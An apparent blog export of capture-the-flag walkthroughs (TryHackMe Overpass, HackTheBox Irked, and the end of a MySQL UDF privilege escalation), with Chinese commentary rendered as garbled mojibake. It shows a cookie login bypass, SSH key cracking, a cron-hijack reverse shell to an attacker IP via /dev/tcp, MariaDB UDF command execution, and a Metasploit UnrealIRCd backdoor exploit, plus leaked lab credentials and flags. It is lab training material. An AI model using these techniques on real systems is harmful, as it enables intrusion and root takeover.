*message) { return(0); } // milw0rm.com [2006-02-20] å¾ˆå®Œå–„çš„ exp å•Šï¼Œè¿˜ç»™äº†æ•™ç¨‹ æˆ‘ä»¬æŠŠ exp ä¸Šä¼ ä¸Šå» ç„¶åæŒ‰ç…§ exp é‡Œçš„æ•™ç¨‹ï¼Œä¸€æ­¥æ­¥æ‰§è¡Œ $ cd /tmp $ gcc -g -c raptor_udf2.c $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o $ raptor_udf2.so raptor_udf2.o -lc $ mysql -u root -p # root:Nildogg36 MariaDB [(none)]&gt; use mysql; MariaDB [mysql]&gt; create table foo(line blob); MariaDB [mysql]&gt; insert into foo values(load_file(&#39;/tmp/raptor_udf2.so&#39;)); MariaDB [mysql]&gt; show variables like &#39;%plugin%&#39;; MariaDB [mysql]&gt; select * from foo into dumpfile &#39;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so&#39;; MariaDB [mysql]&gt; create function do_system returns integer soname &#39;raptor_udf2.so&#39;; MariaDB [mysql]&gt; select * from mysql.func; MariaDB [mysql]&gt; select do_system(&#39;cat /root/root.txt &gt; /tmp/flag.txt;chown svc:svc /tmp/flag.txt&#39;); MariaDB [mysql]&gt; \\! sh $ cat /tmp/flag.txt ç„¶åå°±å¯ä»¥å¾—åˆ° root æƒé™çš„ flag æ–‡ä»¶äº†","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Overpass - TryHackMe","slug":"TryHackMe - Overpass","date":"2022-05-05T00:39:12.000Z","updated":"2023-05-19T10:36:55.000Z","comments":true,"path":"2022/05/05/TryHackMe - Overpass/","link":"","permalink":"http://www.lucifiel.com/2022/05/05/TryHackMe%20-%20Overpass/","excerpt":"","text":"é¶åœºä»‹ç»å½“ä¸€ç¾¤ç ´äº§çš„è®¡ç®—æœºç§‘å­¦ä¸“ä¸šçš„å­¦ç”Ÿå°è¯•åˆ¶ä½œå¯†ç ç®¡ç†å™¨æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿæ˜¾ç„¶æ˜¯ä¸€æ¬¡å®Œç¾çš„å•†ä¸šæˆåŠŸï¼ è¿™ä¸ªç›’å­ä¸Šéšè—ç€ä¸€ä¸ª TryHackMe è®¢é˜…ä»£ç ã€‚ç¬¬ä¸€ä¸ªæ‰¾åˆ°å¹¶æ¿€æ´»å®ƒçš„äººå°†è·å¾—ä¸€ä¸ªæœˆçš„å…è´¹è®¢é˜…ï¼å¦‚æœæ‚¨å·²ç»æ˜¯è®¢é˜…è€…ï¼Œä¸ºä»€ä¹ˆä¸å°†ä»£ç æä¾›ç»™æœ‹å‹å‘¢ï¼Ÿ æ›´æ–°ï¼šè¯¥ä»£ç ç°å·²å£°æ˜ã€‚æœºå™¨äº 2020&#x2F;09&#x2F;25 ç¨ä½œä¿®æ”¹ã€‚è¿™åªæ˜¯ä¸ºäº†æé«˜æœºå™¨çš„æ€§èƒ½ã€‚å®ƒä¸å½±å“è¯¥è¿‡ç¨‹ã€‚ é¶åœºåœ°å€https://tryhackme.com/room/overpass ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.29.27 Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-05 19:44 CST Nmap scan report for 10.10.29.27 Host is up (0.15s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA) | 256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA) |_ 256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Overpass No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=5/5%OT=22%CT=1%CU=34521%PV=Y%DS=2%DC=T%G=Y%TM=6273B8D1 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11 OS:NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN( OS:R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1723/tcp) HOP RTT ADDRESS 1 151.63 ms 10.18.0.1 2 152.12 ms 10.10.29.27 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 46.80 seconds HTTP æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå» FUZZ ä¸€ä¸‹ FUZZâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# gobuster dir -u http://10.10.29.27/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.29.27/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/05/05 07:54:43 Starting gobuster in directory enumeration mode =============================================================== /img (Status: 301) [Size: 0] [--&gt; img/] /downloads (Status: 301) [Size: 0] [--&gt; downloads/] /aboutus (Status: 301) [Size: 0] [--&gt; aboutus/] /admin (Status: 301) [Size: 42] [--&gt; /admin/] /css (Status: 301) [Size: 0] [--&gt; css/] æœ‰ä¸€ä¸ª &#x2F;admin ç›®å½•ï¼Œè¿›å»çœ‹ä¸€ä¸‹ ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œä½¿ç”¨å¼±å£ä»¤æ²¡æœ‰è¿›å»ï¼Œçœ‹ä¸€ä¸‹æºä»£ç  åœ¨é¡µé¢ http://10.10.29.27/login.js ä¸­æ‰¾åˆ°äº†ä¸€å¥ Cookies.set(&quot;SessionToken&quot;,statusOrCookie) åŒæ—¶åœ¨ http://10.10.29.27/main.js è¿˜æœ‰ä¸€ä¸ªå†…å®¹ console.log(&quot;Hello, World!&quot;) è¿™é‡Œåº”è¯¥æ˜¯ Cookie è®¾ç½®ç»•è¿‡ æ¼æ´åˆ©ç”¨æŒ‰ F12 æ‰“å¼€æ§åˆ¶å° è¿™é‡Œä¹Ÿç¡®å®è¾“å‡ºäº† â€œHello, Worldâ€ è¿™é‡Œä¿®æ”¹æˆ‘ä»¬çš„ Payload Cookies.set(&quot;SessionToken&quot;, &quot;&quot;) åœ¨æ§åˆ¶å°è¾“å…¥ä»¥åï¼Œåˆ·æ–° ç›´æ¥ç»•è¿‡äº†ç™»é™†æœºåˆ¶ï¼Œæ‹¿åˆ°äº†ç”¨æˆ· james çš„ sshkey -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337 LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal 73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR 3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P 9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ 4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8 GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk 6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58 dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT 8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K 4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS 49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2 +hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk 2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7 -----END RSA PRIVATE KEY----- å°† sshkey ä¿å­˜åˆ° id_rsa ä¸­ï¼Œå¹¶ç»™äºˆæƒé™ chmod 600 id_rsa æ¥ç€ä½¿ç”¨ ssh è¿›è¡Œç™»é™† â”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop] â””â”€# ssh james@10.10.84.23 -i id_rsa The authenticity of host &#39;10.10.84.23 (10.10.84.23)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:4P0PNh/u8bKjshfc6DBYwWnjk1Txh5laY/WbVPrCUdY. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.84.23&#39; (ECDSA) to the list of known hosts. Enter passphrase for key &#39;id_rsa&#39;: æ˜¾ç¤ºéœ€è¦è¾“å…¥å¯†ç ï¼Œå»ç ´è§£ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop] â””â”€# ssh2john id_rsa &gt; hash â”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop] â””â”€# cat hash id_rsa:$sshng$1$16$9F85D92F34F42626F13A7493AB48F337$1200$2cdbb9c10041cfba4a67771ce135a5c4852e0ffa29262d435693dad3aa708871e17bc663c37feffb19e6b52dcefaa88d2479cb4bca14551e929a8b30e29a8b19c3f70302afaf30d6b70db270eee635d36ccf02e9deeb68ec435d4c86f3bc96a5ef7fde50df64605d2e6bdad90ba9b0a08da21bab1d94d2f866ab1863baebbc3c5e099264833406ce407dc0a830d658d3583cb2f2a9dc963ba03887fc42b1e8a37d06bfe74031f8a94d2478dc518167f1e16b88c3ca45173f43efb85c936d576f04c5e6af7c6e2a407a23a93f8cb8ea59c2eb84f592d2a449ef5f06feef1ca985f7a0998cd0ea378e0a17617c5ec0649900be5b2d0161649346a19f8de671ce965d4e065d6d9ac50847060aef04fff64bd488bdeb8640544615486e3daa887c51dcac264b80e6e003ada0f4c802657268a9825a8a5fea57b5fb0cd9fd4a6b3420207864e564a5ff8e8aee5bb649b8051f0016d12cbc0554f3206a1ac1a7abd17cd1024b1ced6c59973e8570bd6450f7c67ea7c3223a845e6fb25fbaccba1af66455f5b68299a402bf320d0ca752e92859ec4f7831d6892960d644492ab40fec60aea6f5bfaff61cd5198d4dfcd3e5e7913a450e4ccaa67772e3d3bc842f26af9411ebcf9149bf33ccdeb8a647012c97c187d75d43e0be6b00a55cbac745720f0ff4142e9166f35591db690b401951b2d05289bf55a103ea634cbab053e735e5617b10d6f70e6e6a754a124a53f3463cde79a3c6e4ee14f45ab465a60f90c972242cd1569e370dee0a2a4c8ee4543ec52c5c7b7156d1beb7fbc4448188ab386719e13040a58faecf7e095def2312586b295f71c3fef31b62e890a3279631b6605200a6bf7d9d915566cd5738508291c33c18585ea13e32170ad7854d5f8d08d6fdc47491b84ebfb45f579c7b2f7eb1dd9b827c17655a4b7f8763399e8c2371b6277b1c4eb8e76a75acd38eb5cec913723ad605f563cb84b4476a9040917cef352384441dd325c6bcc9d6cab326ac7421b20083d7e766e2a01943860f0398f0294750b5cd16304f52c414ab7b28a01aa206f0dc6e6b692cc1e78310a57e962fec24ea9effc0e5fa58ca35325905f793370bb7713c512ca4b1dfa41c5fdaacacf4ca81b1dd2b2e45e8611ea0a5b19b016e7c74f9b9d4c7a41c3f9678ff284d8188e0f5424bf585f94f741adcb452683223da9fc4c548bb505c98987387c81db53d229f42f3e69298fab2f175468003d295c05b1d8979d78c7104d54c270eaaabbe006ebd7e8dbb1fa17e05e2f41b32ebca93f0789429312cba472ffc86072b5b3e530fc7e405ad26c166590b376f0f98e22c3e60b66899703813bcb13d7c9f5a6e0ae05320de78347b8ffb1d160949a5cb40e29e37071ffcb5b9762a4eec39818d52ec0bc7b227cba37aeb4ffc6700e65eb3ca5aa294e823e3eca24bcd7790d4e30893b0291b178368ca6e745af1bedd491cfb6836552e9267132f5b867e9aed6b52e3d4f14e88b9dd9075e3ea2e8242f8b2f272618211b908eb52689ead701d99b605f708a68662df7a5acc7287ce1d15b6fa12f5907953b49654f198f663663785deb244d25c220083ae62db9fd0b933477b83487606515a24864e6034ba27a624d9c5a4fcc967efe3a1000a40bc304a54ceff2c647dfec54f71e128b3a1d37c15db9ac895f9ea05cd4b6e8edca6bfc53b ç„¶åä½¿ç”¨ john è¿›è¡Œçˆ†ç ´ â”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop] â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash 1 â¨¯ Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 2 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status james13 (id_rsa) 1g 0:00:00:00 DONE (2022-05-05 20:27) 12.50g/s 167200p/s 167200c/s 167200C/s lisa..honolulu Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed. è¿™é‡Œçˆ†ç ´å‡ºæ¥äº†å¯†ç ä¸º james13 å»å°±è¿›è¡Œè¿æ¥ â”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop] â””â”€# ssh james@10.10.84.23 -i id_rsa Enter passphrase for key &#39;id_rsa&#39;: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu May 5 12:32:51 UTC 2022 System load: 0.09 Processes: 92 Usage of /: 22.3% of 18.57GB Users logged in: 0 Memory usage: 12% IP address for eth0: 10.10.84.23 Swap usage: 0% 47 packages can be updated. 0 updates are security updates. Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1 james@overpass-prod:~$ whoami&amp;&amp;id james uid=1001(james) gid=1001(james) groups=1001(james) æˆåŠŸæ‹¿åˆ° user æƒé™ james@overpass-prod:~$ ls todo.txt user.txt james@overpass-prod:~$ cat user.txt thm{65c1aaf000506e56996822c6281e6bf7} æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡james@overpass-prod:~$ cat todo.txt To Do: &gt; Update Overpass&#39; Encryption, Muirland has been complaining that it&#39;s not strong enough &gt; Write down my password somewhere on a sticky note so that I don&#39;t forget it. Wait, we make a password manager. Why don&#39;t I just use that? &gt; Test Overpass for macOS, it builds fine but I&#39;m not sure it actually works &gt; Ask Paradox how he got the automated build script working and where the builds go. They&#39;re not updating on the website è¿™æœ‰ä¸ª todo.txt æ–‡ä»¶ä½œä¸ºæç¤ºï¼Œä¸è¿‡æˆ‘è‹±è¯­ä¸å¥½ï¼Œä¹Ÿä¸ç¡®å®šè¯´çš„å•¥ï¼Œè¿˜æ˜¯å…ˆè·‘ä¸ª LinPeas çœ‹çœ‹å§ SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin 17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly ) * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash è¿™é‡Œçœ‹åˆ°ä¸€ä¸ªï¼Œroot ä¼šä½¿ç”¨ curl å‘ overpass.htm&#x2F;downloads&#x2F;src&#x2F;buildscrit.sh è¯·æ±‚å†…å®¹ï¼Œç„¶åä½¿ç”¨ bash æ‰§è¡Œ â•”â•â•â•â•â•â•â•â•â•â•â•£ Hostname, hosts and DNS overpass-prod 127.0.0.1 localhost 127.0.1.1 overpass-prod 127.0.0.1 overpass.thm ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters nameserver 127.0.0.53 options edns0 search eu-west-1.compute.internal ç„¶ååœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ° overpass.htm æ˜¯æŒ‡å‘çš„ 127.0.0.1 james@overpass-prod:~$ ls -la /etc/hosts -rw-rw-rw- 1 root root 250 Jun 27 2020 /etc/hosts è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æ˜¯æœ‰æƒé™ä¿®æ”¹ &#x2F;etc&#x2F;hosts çš„å†…å®¹çš„ é‚£ææƒæ€è·¯å°±æœ‰äº† é¦–å…ˆåˆ›å»ºæŒ‡å®šçš„ç›®å½•å’Œè„šæœ¬ mkdir -p downloads/src &amp;&amp; vim downloads/src/buildscript.sh ç„¶åå†™å…¥æˆ‘ä»¬çš„ payload bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.18.112.117/4444 &lt;&amp;1&#39; æ¥ç€éœ€è¦ä¸¤ä¸ªçª—å£ ç¬¬ä¸€ä¸ªçª—å£ ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 ç¬¬äºŒä¸ªçª—å£ ä½¿ç”¨ python3 å¼€å¯ä¸€ä¸ª http æœåŠ¡ python3 -m http.server 80 ç„¶åå» shell é‡Œä¿®æ”¹ &#x2F;etc&#x2F;hosts çš„å†…å®¹ 10.18.112.117 overpass.thm æŠŠç¬¬ä¸‰è¡Œæ”¹æˆè¿™æ ·ï¼Œç„¶åç­‰ç€å°±è¡Œäº† â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.84.23 - - [05/May/2022 09:17:01] &quot;GET /downloads/src/buildscript.sh HTTP/1.1&quot; 200 - æˆåŠŸä¸‹è½½äº†æˆ‘ä»¬çš„ payload â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.18.112.117] from (UNKNOWN) [10.10.84.23] 43604 bash: cannot set terminal process group (16146): Inappropriate ioctl for device bash: no job control in this shell root@overpass-prod:~# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸæ‹¿åˆ°äº† root æƒé™ root@overpass-prod:~# ls ls buildStatus builds downloads go root.txt src root@overpass-prod:~# cat root.txt cat root.txt thm{7f336f8c359dbac18d54fdd64ea753bb} æˆåŠŸæ‹¿åˆ°äº† root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"TryHackMe","slug":"TryHackMe","permalink":"http://www.lucifiel.com/tags/TryHackMe/"}]},{"title":"Irked - Hackthebox","slug":"Hackthebox - Irked","date":"2022-04-29T11:38:36.000Z","updated":"2023-05-20T01:54:55.000Z","comments":true,"path":"2022/04/29/Hackthebox - Irked/","link":"","permalink":"http://www.lucifiel.com/2022/04/29/Hackthebox%20-%20Irked/","excerpt":"","text":"Hackthebox - Irkedé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€lucifiel)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.117 1 âš™ Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-29 10:23 CST Nmap scan report for 10.10.10.117 Host is up (0.17s latency). Not shown: 65528 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA) |_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-server-header: Apache/2.4.10 (Debian) |_http-title: Site doesn&#39;t have a title (text/html). 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 49297/tcp status | 100024 1 50541/udp status | 100024 1 51791/udp6 status |_ 100024 1 60368/tcp6 status 6697/tcp open irc UnrealIRCd 8067/tcp open irc UnrealIRCd 49297/tcp open status 1 (RPC #100024) 65534/tcp open irc UnrealIRCd No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/29%OT=22%CT=1%CU=32566%PV=Y%DS=2%DC=T%G=Y%TM=626B4C5 OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1 OS:1NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 143/tcp) HOP RTT ADDRESS 1 170.14 ms 10.10.14.1 2 170.23 ms 10.10.10.117 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 47.84 seconds è¿™è¾¹æœ‰ä¸€ä¸ª 111 ç«¯å£ï¼Œçœ‹ç€åƒæ˜¯ rpcbind æ–¹é¢çš„æ¼æ´ï¼Œå¥½åƒæ˜¯ç¼“å†²åŒºæº¢å‡ºç›¸å…³çš„ï¼Œä½¿ç”¨ msf æ£€æŸ¥è¯•è¯• Metasploitmsf6 auxiliary(scanner/misc/sunrpc_portmapper) &gt; show options Module options (auxiliary/scanner/misc/sunrpc_portmapper): Name Current Setting Required Description ---- --------------- -------- ----------- PROTOCOL tcp yes Protocol to use (Accepted: tcp, udp) RHOSTS 10.10.10.117 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 111 yes The target port (TCP) THREADS 1 yes The number of concurrent threads (max one per host) è®¾ç½®å¥½åå»æ‰§è¡Œ msf6 auxiliary(scanner/misc/sunrpc_portmapper) &gt; exploit [+] 10.10.10.117:111 - SunRPC Programs for 10.10.10.117 ================================ Name Number Version Port Protocol ---- ------ ------- ---- -------- rpcbind 100000 4 111 tcp rpcbind 100000 3 111 tcp rpcbind 100000 2 111 tcp rpcbind 100000 4 111 udp rpcbind 100000 3 111 udp rpcbind 100000 2 111 udp status 100024 1 50541 udp status 100024 1 49297 tcp [*] 10.10.10.117:111 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed æ‰«æåˆ°äº†ï¼Œä½†æ˜¯æ— æ³•åˆ©ç”¨æˆåŠŸï¼Œæ¢ä¸ªå…¶ä»–åœ°æ–¹ç»§ç»­çœ‹ HTTP Web æœåŠ¡æç¤º IRC å¯ä»¥æ­£å¸¸å·¥ä½œï¼Œè¿™é‡Œ 6697ã€8067ã€65534 ä¼¼ä¹éƒ½æ˜¯ IRC æœåŠ¡ï¼Œå»æœç´¢ä¸€ä¸‹ IRC æ˜¯ä»€ä¹ˆä¸œè¥¿ æœç´¢ WIKI å‘ç°ï¼ŒIRC æ˜¯ä¸€ç§åº”ç”¨å±‚çš„åè®®ï¼Œä¸»è¦ç”¨äºç¾¤ä½“èŠå¤©ï¼Œé€šå¸¸ä½¿ç”¨çš„ç«¯å£æ˜¯ 6667 å’Œ 6697ï¼Œæ­£å¥½æˆ‘ä»¬è¿™é‡Œæœ‰ 6697 æ¼æ´åˆ©ç”¨msf6 &gt; search Unreal Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/linux/games/ut2004_secure 2004-06-18 good Yes Unreal Tournament 2004 &quot;secure&quot; Overflow (Linux) 1 exploit/windows/games/ut2004_secure 2004-06-18 good Yes Unreal Tournament 2004 &quot;secure&quot; Overflow (Win32) 2 exploit/unix/irc/unreal_ircd_3281_backdoor 2010-06-12 excellent No UnrealIRCD 3.2.8.1 Backdoor Command Execution Interact with a module by name or index. For example info 2, use 2 or use exploit/unix/irc/unreal_ircd_3281_backdoor ä½¿ç”¨ msf æœåˆ°äº†ä¸€ä¸ªè„šæœ¬ï¼Œå»ä½¿ç”¨ä¸€ä¸‹ msf6 &gt; use 2 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; show options Module options (exploit/unix/irc/unreal_ircd_3281_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39; RPORT 6667 yes The target port (TCP) Exploit target: Id Name -- ---- 0 Automatic Target è®¾ç½®å¥½ RHOSTSï¼Œç„¶åæ‰§è¡Œ msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set payload cmd/unix/reverse payload =&gt; cmd/unix/reverse msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set rhosts 10.10.10.117 rhosts =&gt; 10.10.10.117 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set lhost 10.10.16.12 lhost =&gt; 10.10.16.12 msf6 